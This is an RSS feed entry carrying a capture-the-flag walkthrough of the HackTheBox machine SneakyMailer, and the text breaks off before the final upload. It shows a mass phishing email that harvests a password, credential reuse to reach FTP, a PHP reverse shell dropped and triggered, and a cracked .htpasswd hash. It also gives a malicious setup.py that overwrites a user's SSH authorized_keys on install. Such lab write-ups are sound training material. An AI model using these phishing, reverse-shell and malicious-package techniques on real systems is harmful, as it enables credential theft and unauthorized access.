<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>IMAP on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/imap/</link>
    <description>Recent content in IMAP on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 28 Nov 2020 18:27:21 +0000</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/imap/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/hackthebox/sneakymailer/</link>
      <pubDate>Sat, 28 Nov 2020 18:27:21 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/sneakymailer/</guid>
      <description>Example of a phishing attack and PyPI package exploitation</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box that features a phishing attack. The credentials obtained through phishing allow me to access one of the users&rsquo; mailboxes and obtain another credentials for FTP. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Sudo exploitation on <code>pip3</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Imap</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">21/tcp   open  ftp      vsftpd 3.0.3
</span></span><span class="line"><span class="cl">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">25/tcp   open  smtp     Postfix smtpd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
</span></span><span class="line"><span class="cl">80/tcp   open  http     nginx 1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://sneakycorp.htb
</span></span><span class="line"><span class="cl">143/tcp  open  imap     Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: ENABLE STARTTLS <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">993/tcp  open  ssl/imap Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: ENABLE <span class="nv">AUTH</span><span class="o">=</span>PLAIN CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 NAMESPACE
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http     nginx 1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Welcome to nginx!
</span></span><span class="line"><span class="cl">Service Info: Host:  debian<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
<p><div class="img-container"><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt=""  /></div>
</p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees&rsquo; data of SneakyCorp.</p>
<p><div class="img-container"><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt=""  /></div>
</p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><div class="img-container"><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt=""  /></div>
</p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ cat team <span class="p">|</span> egrep -o <span class="s2">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> <span class="p">|</span> tr -d <span class="s2">&#34;&lt;&gt;&#34;</span> <span class="p">|</span> tee emails.list
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt=""  /></div>
</p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><div class="img-container"><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt=""  /></div>
</p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ swaks --server <span class="s1">&#39;10.10.10.197&#39;</span> --to <span class="sb">`</span>cat emails.list <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span><span class="sb">`</span> --from admin@sneakymailer.htb --body <span class="s2">&#34;http://10.10.14.42/&#34;</span>
</span></span></code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><div class="img-container"><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt=""  /></div>
</p>
<p>The request body contains this data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></span></span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></span></span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><div class="img-container"><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt=""  /></div>
</p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><div class="img-container"><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt=""  /></div>
</p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><div class="img-container"><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt=""  /></div>
</p>
<p>I lost some of my screenshots after the step above, but here is the final configuration.</p>
<p><div class="img-container"><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt=""  /></div>
</p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><div class="img-container"><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt=""  /></div>
</p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
<p><div class="img-container"><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt=""  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><div class="img-container"><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt=""  /></div>
</p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><div class="img-container"><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt=""  /></div>
</p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">211-FTP server status:
</span></span><span class="line"><span class="cl">     Connected to ::ffff:10.10.14.20
</span></span><span class="line"><span class="cl">     Logged in as developer
</span></span><span class="line"><span class="cl">     TYPE: ASCII
</span></span><span class="line"><span class="cl">     No session bandwidth limit
</span></span><span class="line"><span class="cl">     Session timeout in seconds is <span class="m">300</span>
</span></span><span class="line"><span class="cl">     Control connection is plain text
</span></span><span class="line"><span class="cl">     Data connections will be plain text
</span></span><span class="line"><span class="cl">     At session startup, client count was <span class="m">1</span>
</span></span><span class="line"><span class="cl">     vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">cd</span> /dev
</span></span><span class="line"><span class="cl"><span class="m">250</span> Directory successfully changed.
</span></span><span class="line"><span class="cl">ftp&gt; put /shares/reversef.php iamf.php
</span></span><span class="line"><span class="cl">local: /shares/reversef.php remote: iamf.php
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Ok to send data.
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">72</span> bytes sent in 0.00 secs <span class="o">(</span>2.8610 MB/s<span class="o">)</span>
</span></span></code></pre></div><p>The uploaded web shell is available on <code>http://dev.sneakycorp.htb/iamf.php</code>. I will add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code> first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</span></span></code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ curl -s http://dev.sneakycorp.htb/iamf.php
</span></span></code></pre></div><p>My listener has an interactive shell now.</p>
<p><div class="img-container"><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt=""  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><div class="img-container"><img src="imgs/image-20210429003013735.png" alt=""  /></div>
</p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210429003321320.png" alt=""  /></div>
</p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><div class="img-container"><img src="imgs/image-20210429003613068.png" alt=""  /></div>
</p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking at the web configuration file, there is another domain <code>pypi.sneakycorp.htb</code> which is accessible on <code>localhost:5000</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210429005849918.png" alt=""  /></div>
</p>
<p>It also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210429005829551.png" alt=""  /></div>
</p>
<p>Based on the second email that Paul sent to user law.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Hello low
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your current task is to install, test and then erase every python module you 
</span></span><span class="line"><span class="cl">find in our PyPI service, let me know if you have any inconvenience.
</span></span></code></pre></div><p>The idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">setuptools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;README.md&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="o">=</span><span class="s2">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span><span class="p">,</span> <span class="c1"># Replace with your own username</span>
</span></span><span class="line"><span class="cl">    <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">long_description</span><span class="o">=</span><span class="n">long_description</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">project_urls</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Bug Tracker&#34;</span><span class="p">:</span> <span class="s2">&#34;https://github.com/pypa/sampleproject/issues&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">package_dir</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;&#34;</span><span class="p">:</span> <span class="s2">&#34;src&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(</span><span class="n">where</span><span class="o">=</span><span class="s2">&#34;src&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">python_requires</span><span class="o">=</span><span class="s2">&#34;&gt;=3.6&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">setuptools</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/home/low/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl"><span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="o">=</span><span class="s2">&#34;low&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">long_description</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">     <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[distutils]
</span></span><span class="line"><span class="cl">index-servers =
</span></span><span class="line"><span class="cl"> local
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">[local]
</span></span><span class="line"><span class="cl">repository: http://127.0.0.1:5000
</span></span><span class="line"><span class="cl">username: pypi
</span></span><span class="line"><span class="cl">password: soufianeelhaoui
</span></span></code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[distutils]
</span></span><span class="line"><span class="cl">index-servers =
</span></span><span class="line"><span class="cl"> remote
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">[remote]
</span></span><span class="line"><span class="cl">repository: http://pypi.sneakycorp.htb:8080
</span></span><span class="line"><span class="cl">username: pypi
</span></span><span class="line"><span class="cl">password: soufianeelhaoui
</span></span></code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ python3 -m http.server <span class="m">80</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:12<span class="o">]</span> <span class="s2">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span class="m">200</span> -
</span></span><span class="line"><span class="cl">10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:29<span class="o">]</span> <span class="s2">&#34;GET /setup.py HTTP/1.1&#34;</span> <span class="m">200</span> -
</span></span></code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
</span></span><span class="line"><span class="cl">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</span></span></code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── .pypirc
</span></span><span class="line"><span class="cl">├── iamf.php
</span></span><span class="line"><span class="cl">└── setup.py
</span></span></code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@sneakymailer:/dev/shm$ <span class="nb">export</span> <span class="nv">$HOME</span><span class="o">=</span>/dev/shm
</span></span></code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
